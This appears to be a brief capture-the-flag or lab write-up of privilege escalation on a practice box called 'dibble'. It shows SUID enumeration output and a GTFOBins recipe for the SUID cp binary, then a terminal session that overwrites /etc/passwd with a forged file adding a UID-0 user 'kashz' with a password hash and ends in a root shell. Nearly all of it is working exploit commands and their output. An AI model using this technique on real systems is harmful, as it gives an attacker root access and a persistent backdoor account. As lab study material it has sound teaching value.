# 8 box enum benjamin > privesc > root

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/cp
/usr/bin/chage
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
------------------------------

[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/cp -~> https://gtfobins.github.io/gtfobins/cp/#suid
------------------------------

[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Cp ( /usr/bin/cp )
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
/usr/bin/cp $TF $LFILE
------------------------------
```

```
[benjamin@dibble k]$ cat << EOF > passwd
> root:x:0:0:root:/root:/bin/bash
[truncated]
> kashz:cAZZtf3ncxRAY:0:0:root:/root:/bin/bash
> EOF
[benjamin@dibble k]$
[benjamin@dibble k]$ ls -la
total 32
drwxrwxr-x  2 benjamin benjamin  4096 Sep  7 00:53 .
drwx------. 6 benjamin benjamin  4096 Sep  7 00:47 ..
-rw-rw-r--  1 benjamin benjamin  1382 Sep  7 00:53 passwd
-rw-rw-r--  1 benjamin benjamin 16632 Sep  7 00:45 suid.py
[benjamin@dibble k]$ /usr/bin/cp passwd /etc/passwd
[benjamin@dibble k]$ su kashz
Password:
[root@dibble k]# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
dibble
```
